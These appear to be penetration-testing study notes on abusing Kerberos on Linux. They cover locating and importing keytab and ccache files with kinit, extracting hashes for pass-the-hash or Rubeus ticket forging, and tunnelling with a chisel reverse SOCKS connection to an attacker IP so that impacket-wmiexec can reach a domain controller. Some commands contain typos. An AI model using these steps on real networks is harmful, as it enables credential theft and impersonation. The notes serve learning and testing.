> **Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

**KINIT is a sign that kerberos is in use on a linux machine**

>  Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory.
- By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME` 
- This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed
- These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.

***KERBEROS vs KEYTAB files***
A `keytab` is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password).
- . You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. BUt if u change yo pass, you have to regenerate your keytab files 
> **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

1.  *Check if the linux machine is domain joined
- `realm list` or 
- `ps -ef | grep -i "winbind\|sssd" `


2. *Finding keytab files 
- `find / -name *keytab* -ls 2>/dev/null`
> **Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

***Keytab vs cronjob***
finding keytab files in cronjobs 
- `crontab -l`
Kinit allows interation with Kerberos 
- It requests  user's TGT's and stores the ticket in the cache file 
- We can use kinit to import a keytab 

> **Note**: a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account

3. *finding cacche files 
 - `env | grep -k krb5`
- `ls /tmp`

4. *Abusing keytab files 
- `kinit`- obtain and cache tickets
- `klist` - list kerberos principle and tickets
To list keytab file information we would use klist 
```bash
klist -k -t /path/to/keytab/file
```
- Principal - user@hostname
- timestamp
Impersonate with kinit 
> **Note:** **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist.
```bash 
kinit <principal> -k -t /path/to/key/tab/used/
```
klist to confirm 
> **Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

After this one can 
- connect to smb shares: `smbclient //dc01/user -k -c ls`

***KEYTAB EXTRACT*** (502-type `.keytab` files)
- when u wanna access acc using user password
https://github.com/sosdave/KeyTabExtract
- allows us to extract hashes 
- NTLM hash, we can perform a Pass the Hash attack.
- AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password. `Rubeus.exe asktgt /domain: /user /aes256: /nowrap`
> **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.

## Using Linux attack tools with Kerberos
In case we are attacking from a machine that is not a member of the domain
- make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
-  proxy our traffic via `TARGET eg MS01` with a tool such as [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.
1. Host file-> `/etc/hosts`
2. proxychains-> `/etc/proxychains.conf` 
Socks 5 and specific port eg 1080 
> [ProxyList]
socks5 127.0.0.1 1080 
3. chisel 
```bash
sudo ./chisel server --reverse
```
5. connect to the target via RDP
6. Execute chisel 
```powershell
chisel.exe client atcckerip::8080 R:socks
```

now we have to transfer valid cacche file to our attacker and export it as a variable 
```bash 
export KRB5CCNAME=/path/to/ticket
```

To use the kerberos ticket we have to specify the target machine, not the ip address 
```bash 
proxychains impacket-wmiexec dc01 -k --no-pass
```
- `-k` for kerberos auth 
> **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.


To use evil-winrm with kerberos, we need to install the kerberos package for network authentication, `kbr5-user`, with domain as the kerberos realm , server can be empty or the target machine name


